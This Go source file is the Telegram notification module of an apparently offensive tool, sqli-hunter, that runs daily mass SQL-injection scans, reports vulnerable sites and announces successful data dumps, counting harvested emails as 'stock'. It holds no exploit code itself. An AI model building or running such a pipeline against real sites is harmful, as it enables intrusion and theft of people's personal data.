package notify

import (
	"log"

	"github.com/sqli-hunter/sqli-hunter/internal/i18n"
	i18nalert "github.com/sqli-hunter/sqli-hunter/internal/i18n/alert"
	"github.com/sqli-hunter/sqli-hunter/internal/models"
	"github.com/sqli-hunter/sqli-hunter/internal/telegram"
)

type telegramSender struct {
	bc       *telegram.Broadcaster
	texts    i18nalert.Texts
	locale   string
	live     *liveBoard
}

func newFromEnv() Sender {
	telegram.LoadEnvFiles()
	cfg, err := telegram.LoadConfig()
	if err != nil || cfg.Token == "" || len(cfg.Allowed) == 0 {
		return Noop{}
	}

	bc, err := telegram.NewBroadcaster(cfg.Token, cfg.AllowedChatIDs())
	if err != nil {
		log.Printf("notify: %v", err)
		return Noop{}
	}
	if bc == nil {
		return Noop{}
	}

	bundle := i18n.ForLocale(i18n.Locale(cfg.Locale))
	log.Printf("notify: alertes Telegram → %d ID(s) [%s]", len(cfg.Allowed), cfg.Locale)

	return &telegramSender{
		bc:     bc,
		texts:  bundle.Alert,
		locale: cfg.Locale,
		live:   newLiveBoard(bc, cfg.Locale, bundle.Alert),
	}
}

func (t *telegramSender) Enabled() bool { return t != nil && t.bc != nil }

func (t *telegramSender) send(text string) {
	if t.Enabled() {
		t.bc.Broadcast(text)
	}
}

func (t *telegramSender) Launch(title, detail string) {
	if t.live != nil {
		t.live.setLaunch(title, detail)
		return
	}
	t.send(t.texts.Launch(title, detail))
}

func (t *telegramSender) DiscoverDone(kept, skipped, fetched int) {
	if t.live != nil {
		t.live.discoverDone(kept, skipped, fetched)
		return
	}
	t.send(t.texts.DiscoverDone(kept, skipped, fetched))
}

func (t *telegramSender) ScanStarted(urlCount int, listFile string) {
	if t.live != nil {
		t.live.scanStarted(urlCount, listFile)
		return
	}
	t.send(t.texts.ScanStarted(urlCount, listFile))
}

func (t *telegramSender) Vuln(f models.Finding) {
	if t.live != nil {
		t.live.addVuln(f)
		return
	}
	t.send(t.texts.Vuln(f))
}

func (t *telegramSender) DumpFail(f models.Finding, reason string) {
	if t.live != nil {
		t.live.addVuln(f)
		return
	}
	t.send(t.texts.DumpFail(f, reason))
}

func (t *telegramSender) DumpOK(d models.ExtractedData, email string) {
	if t.live != nil {
		t.live.addEmail(email)
		return
	}
	t.send(t.texts.DumpOK(d, email))
}

func (t *telegramSender) Complete(title, detail string) {
	if t.live != nil {
		t.live.complete(title, detail, "", 0, 0, 0, 0, 0, false)
		return
	}
	t.send(t.texts.Complete(title, detail))
}

func (t *telegramSender) Error(msg string) {
	if t.live != nil {
		t.live.setError(msg)
		return
	}
	t.send(t.texts.Error(msg))
}

func (t *telegramSender) DiscoverProgress(phase string, step, total, kept, fetched, skipped int) {
	if t.live != nil {
		t.live.updateDiscover(phase, step, total, kept, fetched, skipped)
		return
	}
	t.send(t.texts.DiscoverProgress(phase, step, total, kept, fetched, skipped))
}

func (t *telegramSender) ScanProgress(scanned, total, vulns, findings int) {
	if t.live != nil {
		t.live.updateScan(scanned, total, vulns, findings)
		return
	}
	t.send(t.texts.ScanProgress(scanned, total, vulns, findings))
}

// DailyLaunch alerte démarrage daily.
func DailyLaunch(n Sender, limit, threads int, outputDir string) {
	ts, ok := n.(*telegramSender)
	if !ok || !ts.Enabled() {
		return
	}
	ts.Launch(ts.texts.TitleDailyLaunch, ts.texts.DailyLaunch(limit, threads, outputDir))
}

// DailyNoNew alerte fin daily sans nouvelles URLs.
func DailyNoNew(n Sender, baseDir string) {
	ts, ok := n.(*telegramSender)
	if !ok || !ts.Enabled() {
		return
	}
	detail := ts.texts.DailyNoNew(baseDir)
	stock := ts.texts.StockSummary(baseDir)
	if ts.live != nil {
		ts.live.complete(ts.texts.TitleDailyComplete, detail, stock, 0, 0, 0, 0, 0, true)
		return
	}
	ts.Complete(ts.texts.TitleDailyComplete, detail)
}

// ScanComplete alerte fin de scan massif.
func ScanComplete(n Sender, scanned, total, vulns, findings, newEmails int, stock string) {
	ts, ok := n.(*telegramSender)
	if !ok || !ts.Enabled() {
		return
	}
	detail := i18nalert.ScanCompleteDetail(ts.locale, scanned, total, vulns, findings, newEmails, "")
	if ts.live != nil {
		ts.live.complete(ts.texts.TitleScanComplete, detail, stock, scanned, total, vulns, findings, newEmails, false)
		return
	}
	ts.Complete(ts.texts.TitleScanComplete, detail+"\n\n"+stock)
}
